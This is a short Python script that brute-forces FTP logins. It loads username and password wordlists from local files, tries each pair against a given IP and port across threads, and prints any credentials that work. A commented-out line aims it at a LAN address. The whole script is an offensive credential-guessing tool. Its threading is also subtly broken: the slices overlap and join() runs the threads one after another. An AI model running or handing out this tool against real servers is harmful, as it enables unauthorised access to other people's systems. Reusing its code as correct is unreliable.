#! -*- coding:utf-8 -*-
import socket
import threading
import re
from ftplib import FTP
count=0
flag = False
lock = threading.Lock()
force_result={}
def test(username,password,ip,port):
    global count
    global flag
    global ftp
    global force_result
    global result
    for user in username:
        for passwd in password:
            lock.acquire()
            count+=1
            lock.release()
            if flag==True:
                return
            try:
                ftp = FTP()
                banner = ftp.connect(ip,port,timeout=2)
                ftp.login(user, passwd)
                ftp.quit()
                print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
                force_result['username']=user
                force_result['password'] = passwd
                force_result['count']=count
                flag=True

                return
            except:
                pass



def ftp_brute(thread_num,ip,port):

    with open(r'C:\Users\dkl\Desktop\uuuu.txt', 'r') as f:
        temp = f.readlines()
    username = [str.rstrip() for str in temp]

    with open(r'C:\Users\dkl\Desktop\pppp.txt', 'r') as f:
        temp = f.readlines()
    password = [str.rstrip() for str in temp]


    times = int(len(username) / thread_num)
    for i in range(thread_num):
        t1 = threading.Thread(target=test, args=(username[i:(i + 1) * times], password,ip,port))
        t1.start()
        t1.join()
    test(username[thread_num * times:], password,ip,port)
    return force_result
# ftp_brute(2,'192.168.80.130',21)
# print(force_result)

# if __name__ == '__main__':





